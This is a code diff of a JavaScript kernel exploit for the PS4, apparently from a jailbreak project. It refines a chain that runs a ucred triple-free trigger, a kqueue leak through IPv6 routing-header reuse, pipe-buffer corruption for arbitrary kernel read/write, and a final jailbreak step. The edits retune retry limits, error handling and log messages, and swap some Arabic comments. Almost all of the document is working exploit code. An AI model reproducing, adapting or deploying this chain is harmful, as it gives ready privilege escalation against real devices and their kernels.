@@ -1032,14 +1032,13 @@ function netctrl_exploit() {
   log('Setting up exploit...');
   yield_to_render(exploit_phase_setup);
 }
-
 function exploit_phase_setup() {
   if (exploit_end) return;
 
   var ok = setup();
   if (!ok) {
-    log('Setup failed, aborting exploit.');
-    exploit_end = true;      // فشل نهائي فعلاً
+    log('Setup failed — exploit aborted.');
+    exploit_end = true;
     return;
   }
 
@@ -1047,50 +1046,44 @@ function exploit_phase_setup() {
   exploit_count = 0;
   yield_to_render(exploit_phase_trigger);
 }
-
 function exploit_phase_trigger() {
   if (exploit_end) return;
 
   if (exploit_count >= MAIN_LOOP_ITERATIONS) {
     log('Failed to acquire kernel R/W');
-    exploit_end = true;      // استنفدنا كل المحاولات
+    exploit_end = true;
     return;
   }
 
   exploit_count++;
-  log('Triggering Retrying... (' + exploit_count + '/' + MAIN_LOOP_ITERATIONS + ')...');
+  log('Triggering... (' + exploit_count + '/' + MAIN_LOOP_ITERATIONS + ')');
 
   if (!trigger_ucred_triplefree()) {
-    // التريجر فشل المرة دي بس، مش فشل نهائي
     yield_to_render(exploit_phase_trigger);
     return;
   }
 
-  // التريجر نجح → نروح للـ leak
-  log('Leaking Exploit...');
+  log('Leaking...');
   yield_to_render(exploit_phase_leak);
 }
-
 function exploit_phase_leak() {
   if (exploit_end) return;
 
   if (!leak_kqueue_safe()) {
-    // leak فشل المرة دي بس، نرجع نعيد التريجر
     log('Leak failed — retrying...');
     yield_to_render(exploit_phase_trigger);
     return;
   }
 
-  // leak نجح → نروح للـ RW
   log('Exploit Read/Write...');
   log('Stability by M.ELHOUT');
   yield_to_render(exploit_phase_rw);
 }
-
 function exploit_phase_rw() {
   if (exploit_end) return;
 
   var ok = true;
+
   try {
     setup_arbitrary_rw();
   } catch (e) {
@@ -1098,27 +1091,26 @@ function exploit_phase_rw() {
   }
 
   if (!ok) {
-    // هنا فعلاً مافيش رجوع منطقي
-    utils.notify('Jailbreak failed — please reboot your PS4.');
+    log('R/W setup failed — please reboot your PS4.');
     exploit_end = true;
     return;
   }
 
   log(' Stability by M.ELHOUT...');
+  yield_to_render(exploit_phase_jailbreak);
   utils.notify('Jailbreak Success');
   utils.notify('Stability by M.ELHOUT');
   utils.notify('< Sob7an allh W b Hamdh >');
   utils.notify('< Sob7an allh alazeem >');
-
-  yield_to_render(exploit_phase_jailbreak);
 }
-
 function exploit_phase_jailbreak() {
   if (exploit_end) return;
 
   jailbreak();
   cleanup();
-  exploit_end = true;   // هنا بس نقفل الباب فعلاً
+  exploit_end = true;
+
+  log('Jailbreak completed successfully');
 }
 function safe_fhold_fd(fd, label) {
   if (fd < 0) {
@@ -1135,54 +1127,47 @@ function safe_fhold_fd(fd, label) {
   fhold(fp);
 }
 function setup_arbitrary_rw() {
-  log(' Exploit Read/Write...');
+  log('Setting up arbitrary R/W...');
 
-  // 1) تأكيد إن kq_fdp صالح
   if (kq_fdp.eq(0)) {
-    cleanup();
-    throw new Error(' Jailbreak failed - invalid kq_fdp');
+    log('Invalid kq_fdp');
+    throw new Error('rw_fail');
   }
 
-  // 2) قراءة fd_files
   var fd_files = kreadslow64_safe(kq_fdp);
   if (fd_files.eq(BigInt_Error)) {
-    cleanup();
-    throw new Error(' Jailbreak failed - fd_files leak failed');
+    log('fd_files leak failed');
+    throw new Error('rw_fail');
   }
 
   fdt_ofiles = fd_files;
 
-  // 3) تأكيد صلاحية master/victim pipes
   if (master_pipe[0] < 0 || victim_pipe[0] < 0) {
-    cleanup();
-    throw new Error(' Jailbreak failed - invalid pipe fds');
+    log('Invalid pipe fds');
+    throw new Error('rw_fail');
   }
 
-  // 4) قراءة file pointers
   master_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
   victim_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE));
 
   if (master_r_pipe_file.eq(BigInt_Error) || victim_r_pipe_file.eq(BigInt_Error)) {
-    cleanup();
-    throw new Error(' Jailbreak failed - pipe file leak failed');
+    log('Pipe file leak failed');
+    throw new Error('rw_fail');
   }
 
-  // 5) قراءة pipe data
   master_r_pipe_data = kreadslow64_safe(master_r_pipe_file.add(0x00));
   victim_r_pipe_data = kreadslow64_safe(victim_r_pipe_file.add(0x00));
 
   if (master_r_pipe_data.eq(BigInt_Error) || victim_r_pipe_data.eq(BigInt_Error)) {
-    cleanup();
-    throw new Error(' Jailbreak failed - pipe data leak failed');
+    log('Pipe data leak failed');
+    throw new Error('rw_fail');
   }
 
-  // 6) تأكيد إن pipe data valid
   if (master_r_pipe_data.eq(0) || victim_r_pipe_data.eq(0)) {
-    cleanup();
-    throw new Error(' Jailbreak failed - invalid pipe data');
+    log('Invalid pipe data');
+    throw new Error('rw_fail');
   }
 
-  // 7) تعديل pipebuf
   write32(master_pipe_buf.add(0x00), 0);
   write32(master_pipe_buf.add(0x04), 0);
   write32(master_pipe_buf.add(0x08), 0);
@@ -1191,43 +1176,22 @@ function setup_arbitrary_rw() {
 
   var ret_write = kwriteslow(master_r_pipe_data, master_pipe_buf, PIPEBUF_SIZE);
   if (ret_write.eq(BigInt_Error)) {
-    cleanup();
-    throw new Error(' Jailbreak failed - pipebuf write failed');
+    log('Pipebuf write failed');
+    throw new Error('rw_fail');
   }
 
-  // 8) زيادة refcount مع حراسة على fp
   safe_fhold_fd(master_pipe[0], 'master_pipe[0]');
   safe_fhold_fd(master_pipe[1], 'master_pipe[1]');
   safe_fhold_fd(victim_pipe[0], 'victim_pipe[0]');
   safe_fhold_fd(victim_pipe[1], 'victim_pipe[1]');
 
-  // 9) تنظيف rthdr (best-effort – لا يوقع الإكسبلويت)
-  try {
-    remove_rthr_from_socket(ipv6_socks[triplets[0]]);
-  } catch (e) {
-    log('remove_rthr_from_socket triplet[0] failed (ignored)');
-  }
+  try { remove_rthr_from_socket(ipv6_socks[triplets[0]]); } catch (e) {}
+  try { remove_rthr_from_socket(ipv6_socks[triplets[1]]); } catch (e) {}
+  try { remove_rthr_from_socket(ipv6_socks[triplets[2]]); } catch (e) {}
 
-  try {
-    remove_rthr_from_socket(ipv6_socks[triplets[1]]);
-  } catch (e) {
-    log('remove_rthr_from_socket triplet[1] failed (ignored)');
-  }
-
-  try {
-    remove_rthr_from_socket(ipv6_socks[triplets[2]]);
-  } catch (e) {
-    log('remove_rthr_from_socket triplet[2] failed (ignored)');
-  }
-
-  // 10) إزالة الملف الثلاثي freed
   remove_uaf_file();
 
-  // 11) نجاح
-  log('Arbitrary R/W achieved');
-
-  // 12) انتقال نظيف
-  yield_to_render(exploit_phase_jailbreak);
+  log('Arbitrary R/W ready');
 }
 
 function find_allproc() {
@@ -1385,7 +1349,8 @@ var victim_pipe_buf = malloc(PIPEBUF_SIZE);
 
 function corrupt_pipe_buf(cnt, _in, out, size, buffer) {
   if (buffer.eq(0)) {
-    throw new Error('buffer cannot be zero');
+    log('corrupt_pipe_buf: buffer cannot be zero');
+    return BigInt_Error;
   }
   if (size <= 0 || size > PAGE_SIZE) {
     log('corrupt_pipe_buf: invalid size ' + size);
@@ -1401,14 +1366,18 @@ function corrupt_pipe_buf(cnt, _in, out, size, buffer) {
   write(new BigInt(masterWpipeFd), victim_pipe_buf, PIPEBUF_SIZE);
   return read(new BigInt(masterRpipeFd), victim_pipe_buf, PIPEBUF_SIZE);
 }
-
 function kwrite(dest, src, n) {
   if (dest.eq(0) || src.eq(0) || n <= 0) {
     log('kwrite: invalid dest/src/size');
     return BigInt_Error;
   }
 
-  corrupt_pipe_buf(0, 0, 0, PAGE_SIZE, dest);
+  var ret = corrupt_pipe_buf(0, 0, 0, PAGE_SIZE, dest);
+  if (ret.eq && ret.eq(BigInt_Error)) {
+    log('kwrite: corrupt_pipe_buf failed');
+    return BigInt_Error;
+  }
+
   return write(new BigInt(victimWpipeFd), src, n);
 }
 
@@ -1418,26 +1387,32 @@ function kread(dest, src, n) {
     return BigInt_Error;
   }
 
-  corrupt_pipe_buf(n, 0, 0, PAGE_SIZE, src);
+  var ret = corrupt_pipe_buf(n, 0, 0, PAGE_SIZE, src);
+  if (ret.eq && ret.eq(BigInt_Error)) {
+    log('kread: corrupt_pipe_buf failed');
+    return BigInt_Error;
+  }
+
   read(new BigInt(victimRpipeFd), dest, n);
   return new BigInt(0);
 }
+
 function kwrite64(addr, val) {
   if (addr.eq(0)) {
     log('kwrite64: invalid addr 0');
-    return;
+    return BigInt_Error;
   }
   write64(tmp, val);
-  kwrite(addr, tmp, 8);
+  return kwrite(addr, tmp, 8);
 }
 
 function kwrite32(addr, val) {
   if (addr.eq(0)) {
     log('kwrite32: invalid addr 0');
-    return;
+    return BigInt_Error;
   }
   write32(tmp, val);
-  kwrite(addr, tmp, 4);
+  return kwrite(addr, tmp, 4);
 }
 
 function kread64(addr) {
@@ -1445,7 +1420,11 @@ function kread64(addr) {
     log('kread64: invalid addr 0');
     return new BigInt(0);
   }
-  kread(tmp, addr, 8);
+  var ret = kread(tmp, addr, 8);
+  if (ret.eq && ret.eq(BigInt_Error)) {
+    log('kread64: kread failed at ' + hex(addr));
+    return new BigInt(0);
+  }
   return read64(tmp);
 }
 
@@ -1454,7 +1433,11 @@ function kread32(addr) {
     log('kread32: invalid addr 0');
     return 0;
   }
-  kread(tmp, addr, 4);
+  var ret = kread(tmp, addr, 4);
+  if (ret.eq && ret.eq(BigInt_Error)) {
+    log('kread32: kread failed at ' + hex(addr));
+    return 0;
+  }
   return read32(tmp);
 }
 
@@ -1500,8 +1483,9 @@ kernel.write_buffer = function (kaddr, buf) {
 };
 
 function remove_uaf_file() {
-  if (uaf_socket === undefined) {
-    throw new Error('uaf_socket is undefined');
+  if (typeof uaf_socket === 'undefined') {
+    log('remove_uaf_file: uaf_socket is undefined');
+    return;
   }
 
   if (uaf_socket < 0) {
@@ -1510,6 +1494,11 @@ function remove_uaf_file() {
   }
 
   var uafFile = fget(uaf_socket);
+  if (!uafFile || uafFile.eq(0)) {
+    log('remove_uaf_file: fget returned 0 for uaf_socket');
+    return;
+  }
+
   kwrite64(fdt_ofiles.add(uaf_socket * FILEDESCENT_SIZE), new BigInt(0));
 
   var removed = 0;
@@ -1521,7 +1510,8 @@ function remove_uaf_file() {
       continue;
     }
 
-    if (fget(s).eq(uafFile)) {
+    var fp = fget(s);
+    if (fp && fp.eq(uafFile)) {
       kwrite64(fdt_ofiles.add(s * FILEDESCENT_SIZE), new BigInt(0));
       removed++;
     }
@@ -1667,48 +1657,55 @@ function leak_kqueue() {
   var magic_add = leak_rthdr.add(0x08);
 
   var count     = 0;
-  var MAX_KQ    = 4000;   // قللناها جامد
-  var INNER_MAX = 60;     // أقل من 100
+  var MAX_KQ    = 4000;
+  var INNER_MAX = 60;
 
   var success   = false;
 
   while (count < MAX_KQ) {
     count++;
 
+    // 1) إنشاء kqueue
     kq = kqueue();
     if (kq.eq(BigInt_Error)) {
       return false;
     }
 
+    // 2) تصفير buffer قبل أول get_rthdr
     write64(magic_add, 0);
     write64(leak_rthdr.add(0x98), 0);
 
-    // ييلد بسيط قبل free علشان ما نكتمش السيستم
+    // 3) تهوية بسيطة قبل free
     sched_yield();
 
+    // 4) تحرير rthdr لفتح نافذة reuse
     free_rthdr(ipv6_socks[triplets[1]]);
 
     var inner_tries = 0;
 
     while (inner_tries < INNER_MAX) {
 
-      // دبق أخف كمان
+      // 5) دبق خفيف
       for (var d = 0; d < 10; d++) {}
 
+      // 6) محاولة قراءة rthdr بعد free
       get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
 
+      // 7) قراءة magic + fdp
       var magic = read64(magic_add);
       var fdp   = read64(leak_rthdr.add(0x98));
 
+      // 8) شرط النجاح
       if (magic.eq(magic_val) && !fdp.eq(0)) {
         success = true;
         break;
       }
 
+      // 9) تصفير متناغم بعد كل محاولة فاشلة
       write64(magic_add, 0);
       write64(leak_rthdr.add(0x98), 0);
 
-      // ييلد أسرع
+      // 10) yield دوري لمنع التجميد
       if ((inner_tries % 10) === 0) {
         sched_yield();
       }
@@ -1716,6 +1713,7 @@ function leak_kqueue() {
       inner_tries++;
     }
 
+    // 11) نجاح leak
     if (success) {
       kl_lock = read64(leak_rthdr.add(0x60));
       kq_fdp  = read64(leak_rthdr.add(0x98));
@@ -1726,16 +1724,22 @@ function leak_kqueue() {
       }
 
       close(kq);
+
+      // إعادة ضبط triplet بعد نجاح leak
       triplets[1] = find_triplet(triplets[0], triplets[2]);
+
       return true;
     }
 
+    // 12) فشل في هذه الدورة
     close(kq);
     sched_yield();
   }
 
+  // 13) استنفاد المحاولات
   return false;
 }
+
 function leak_kqueue_safe() {
   try {
     return leak_kqueue();
@@ -1754,12 +1758,12 @@ function kreadslow64(address) {
 
   var buffer = kreadslow(address, 8);
   if (buffer.eq(BigInt_Error)) {
-    cleanup();
-    throw new Error(' Jailbreak failed - Reboot and try again');
+    log('kreadslow64: kreadslow failed at ' + hex(address));
+    return BigInt_Error;
   }
+
   return read64(buffer);
 }
-
 function kreadslow64_safe(address) {
   if (address.eq(0)) {
     return BigInt_Error;
@@ -1768,9 +1772,9 @@ function kreadslow64_safe(address) {
   var buffer = kreadslow(address, 8);
   if (buffer.eq(BigInt_Error)) {
     log('kreadslow64_safe: kreadslow failed at ' + hex(address));
-    // لا cleanup، لا throw
     return BigInt_Error;
   }
+
   return read64(buffer);
 }
 function build_uio(uio, uio_iov, uio_td, read, addr, size) {
@@ -1789,12 +1793,12 @@ function build_uio(uio, uio_iov, uio_td, read, addr, size) {
 // =========================
 
 // UIO reclaim max loops
-var KREAD_MAX_UIO_RECLAIM  = 10000;
-var KWRITE_MAX_UIO_RECLAIM = 10000;
+var KREAD_MAX_UIO_RECLAIM  = 1000;
+var KWRITE_MAX_UIO_RECLAIM = 1000;
 
 // IOV reclaim max loops
-var KREAD_MAX_IOV_RECLAIM  = 10000;
-var KWRITE_MAX_IOV_RECLAIM = 10000;
+var KREAD_MAX_IOV_RECLAIM  = 1000;
+var KWRITE_MAX_IOV_RECLAIM = 1000;
 
 // Memory exhaustion threshold
 var MEMORY_ZERO_THRESHOLD = 5;
@@ -1814,13 +1818,13 @@ function kreadslow(addr, size) {
     return BigInt_Error;
   }
 
+  // memory exhaustion check
   if (typeof debugging !== 'undefined' &&
       debugging.info &&
       debugging.info.memory &&
       debugging.info.memory.available === 0) {
 
-    log('kreadslow: memory exhausted before start — please reboot your PS4 and try again.');
-    cleanup(true);
+    log('kreadslow: memory exhausted before start');
     return BigInt_Error;
   }
 
@@ -1839,7 +1843,6 @@ function kreadslow(addr, size) {
   setsockopt(new BigInt(uio_sock_1), SOL_SOCKET, SO_SNDBUF, sockopt_val_buf, 4);
 
   write(new BigInt(uio_sock_1), tmp, size);
-
   write64(uioIovRead.add(0x08), size);
 
   if (triplets[1] < 0 || triplets[1] >= ipv6_socks.length) {
@@ -1864,8 +1867,7 @@ function kreadslow(addr, size) {
 
       zeroMemoryCount++;
       if (zeroMemoryCount >= MEMORY_ZERO_THRESHOLD) {
-        log('kreadslow: memory exhausted during UIO reclaim — please reboot your PS4 and try again.');
-        cleanup(true);
+        log('kreadslow: memory exhausted during UIO reclaim');
         return BigInt_Error;
       }
 
@@ -1889,13 +1891,11 @@ function kreadslow(addr, size) {
   }
 
   if (count >= KREAD_MAX_UIO_RECLAIM) {
-    log('kreadslow: UIO reclaim timeout — please reboot your PS4 and try again.');
-    cleanup(true);
+    log('kreadslow: UIO reclaim timeout');
     return BigInt_Error;
   }
 
   var uio_iov = read64(leak_rthdr);
-
   build_uio(msgIov, uio_iov, 0, true, addr, size);
 
   if (triplets[2] < 0 || triplets[2] >= ipv6_socks.length) {
@@ -1921,16 +1921,14 @@ function kreadslow(addr, size) {
 
       zeroMemoryCount2++;
       if (zeroMemoryCount2 >= MEMORY_ZERO_THRESHOLD) {
-        log('kreadslow: memory exhausted during IOV reclaim — please reboot your PS4 and try again.');
-        cleanup(true);
+        log('kreadslow: memory exhausted during IOV reclaim');
         return BigInt_Error;
       }
 
     } else zeroMemoryCount2 = 0;
 
     if (count2 >= KREAD_MAX_IOV_RECLAIM) {
-      log('kreadslow: IOV reclaim timeout — please reboot your PS4 and try again.');
-      cleanup(true);
+      log('kreadslow: IOV reclaim timeout');
       return BigInt_Error;
     }
 
@@ -1962,10 +1960,9 @@ function kreadslow(addr, size) {
   write(new BigInt(iov_sock_1), tmp, 1);
 
   if (leak_buffer.eq(0)) {
-    log('kreadslow: no valid leak found — reboot required.');
+    log('kreadslow: no valid leak found');
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
-    cleanup(true);
     return BigInt_Error;
   }
 
@@ -1976,10 +1973,9 @@ function kreadslow(addr, size) {
   }
 
   if (triplets[2] === -1) {
-    log('kreadslow: failed to find triplets[2] — reboot required.');
+    log('kreadslow: failed to find triplets[2]');
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
-    cleanup(true);
     return BigInt_Error;
   }
 
@@ -2030,8 +2026,7 @@ function kwriteslow(addr, buffer, size) {
 
       zeroMemoryCount++;
       if (zeroMemoryCount >= MEMORY_ZERO_THRESHOLD) {
-        log('kwriteslow: memory exhausted during UIO reclaim — please reboot your PS4 and try again.');
-        cleanup(true);
+        log('kwriteslow: memory exhausted during UIO reclaim');
         return BigInt_Error;
       }
 
@@ -2039,8 +2034,7 @@ function kwriteslow(addr, buffer, size) {
 
     count++;
     if (count >= KWRITE_MAX_UIO_RECLAIM) {
-      log('kwriteslow: UIO reclaim timeout — please reboot your PS4 and try again.');
-      cleanup(true);
+      log('kwriteslow: UIO reclaim timeout');
       return BigInt_Error;
     }
 
@@ -2081,8 +2075,7 @@ function kwriteslow(addr, buffer, size) {
 
       zeroMemoryCount2++;
       if (zeroMemoryCount2 >= MEMORY_ZERO_THRESHOLD) {
-        log('kwriteslow: memory exhausted during IOV reclaim — please reboot your PS4 and try again.');
-        cleanup(true);
+        log('kwriteslow: memory exhausted during IOV reclaim');
         return BigInt_Error;
       }
 
@@ -2090,8 +2083,7 @@ function kwriteslow(addr, buffer, size) {
 
     count2++;
     if (count2 >= KWRITE_MAX_IOV_RECLAIM) {
-      log('kwriteslow: IOV reclaim timeout — please reboot your PS4 and try again.');
-      cleanup(true);
+      log('kwriteslow: IOV reclaim timeout');
       return BigInt_Error;
     }
 
@@ -2123,10 +2115,9 @@ function kwriteslow(addr, buffer, size) {
   }
 
   if (triplets[2] === -1) {
-    log('kwriteslow: failed to find triplets[2] — reboot required.');
+    log('kwriteslow: failed to find triplets[2]');
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
-    cleanup(true);
     return BigInt_Error;
   }
 
